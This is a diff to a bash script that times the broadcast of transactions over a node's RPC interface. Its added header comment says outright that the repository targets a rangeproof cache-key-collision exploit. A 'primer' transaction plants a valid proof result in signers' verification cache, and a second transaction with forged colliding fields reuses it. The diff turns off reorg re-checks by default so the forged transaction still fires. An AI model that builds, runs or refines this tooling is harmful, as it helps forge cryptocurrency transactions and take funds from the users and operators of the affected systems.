@@ -32,6 +32,21 @@
 #   CONFIRM_METHOD "wallet" (wallet gettransaction, no txindex; DEFAULT)
 #                | "getraw" (needs txindex=1)
 #                | "scan"   (block scan, no txindex)
+#   REORG_CHECK    reorg re-verification: 0 = off (DEFAULT), 1 = on
+#                  Set 1 only if sending TX2 requires TX1 to be FINAL on the active
+#                  chain (e.g. TX2 spends a TX1 output): getraw then re-checks
+#                  in_active_chain, scan re-checks its found block is still at height.
+#                  DEFAULT is OFF: the range-proof cache-key-collision exploit this
+#                  repo targets does NOT need it. TX1 (the primer) plants a genuine,
+#                  VALID rangeproof result in the signers' in-memory verification cache;
+#                  TX2 (the exploit) reuses that entry via a cache-key collision (its
+#                  forged variable-length fields, concatenated without length prefixes,
+#                  hash to the same key). That entry is written at validation time in a
+#                  process-static CuckooCache that a chain reorg does NOT evict (the
+#                  disconnect path never touches the cache). So a reorg of TX1's block
+#                  does not remove the planted entry and TX2 stays valid; gating on "TX1
+#                  still on the active chain" would only needlessly withhold a
+#                  still-viable TX2. Once TX1 is seen confirmed once, fire TX2.
 #
 # NOTE on the default "wallet" method:
 #   gettransaction only knows transactions the wallet is aware of -- i.e. txs
@@ -49,6 +64,7 @@ POLL_INTERVAL="${POLL_INTERVAL:-5}"
 TIMEOUT="${TIMEOUT:-3600}"
 MAXFEERATE="${MAXFEERATE:-}"
 CONFIRM_METHOD="${CONFIRM_METHOD:-wallet}"
+REORG_CHECK="${REORG_CHECK:-0}"          # 0 = off (default; see header note), 1 = on
 
 log() { printf '%s %s\n' "$(date '+%H:%M:%S')" "$*" >&2; }
 die() { printf 'error: %s\n' "$*" >&2; exit 1; }
@@ -101,12 +117,18 @@ confirmed_getraw() {
   conf=$(jq -r '.confirmations // 0' <<< "$json")
   [[ -z "$bh" ]] && { printf ''; return 0; }          # still in mempool
   if (( conf >= REQUIRED_CONF )); then
-    # reorg-safety: re-query inside that specific block for in_active_chain
-    # NB: jq's `// true` would also swallow an explicit `false`; default ONLY when the
-    # field is absent (reorg re-check must honor in_active_chain==false).
-    active=$(rpc getrawtransaction "$txid" true "$bh" 2>/dev/null \
-             | jq -r 'if has("in_active_chain") then .in_active_chain else true end')
-    [[ "$active" == "true" ]] && printf '%s' "$bh"
+    if [[ "$REORG_CHECK" == 1 ]]; then
+      # reorg-safety (opt-in; see REORG_CHECK note in header): re-query inside that
+      # specific block for in_active_chain. NB: jq's `// true` would also swallow an
+      # explicit `false`; default ONLY when the field is absent (must honor false).
+      active=$(rpc getrawtransaction "$txid" true "$bh" 2>/dev/null \
+               | jq -r 'if has("in_active_chain") then .in_active_chain else true end')
+      [[ "$active" == "true" ]] && printf '%s' "$bh"
+    else
+      # REORG_CHECK=0 (default): confirmed to depth is enough; do not re-verify the block
+      # is still on the active chain -- not needed for the cache-key-collision exploit.
+      printf '%s' "$bh"
+    fi
   fi
   printf ''
 }
@@ -132,13 +154,17 @@ confirmed_scan() {
     done
   fi
   if [[ -n "$_found_hash" ]]; then
-    cur=$(rpc getblockhash "$_found_height" 2>/dev/null || echo "")
-    if [[ "$cur" != "$_found_hash" ]]; then          # reorged out -> rescan
-      _scan_from="$_found_height"; _found_hash=""; _found_height=0
-    else
-      conf=$(( tip - _found_height + 1 ))
-      (( conf >= REQUIRED_CONF )) && printf '%s' "$_found_hash"
+    if [[ "$REORG_CHECK" == 1 ]]; then
+      # reorg-safety (opt-in; see REORG_CHECK note in header): if our block is no longer
+      # at that height it was reorged out -> rescan.
+      cur=$(rpc getblockhash "$_found_height" 2>/dev/null || echo "")
+      if [[ "$cur" != "$_found_hash" ]]; then
+        _scan_from="$_found_height"; _found_hash=""; _found_height=0
+        printf ''; return 0
+      fi
     fi
+    conf=$(( tip - _found_height + 1 ))
+    (( conf >= REQUIRED_CONF )) && printf '%s' "$_found_hash"
   fi
   printf ''
 }
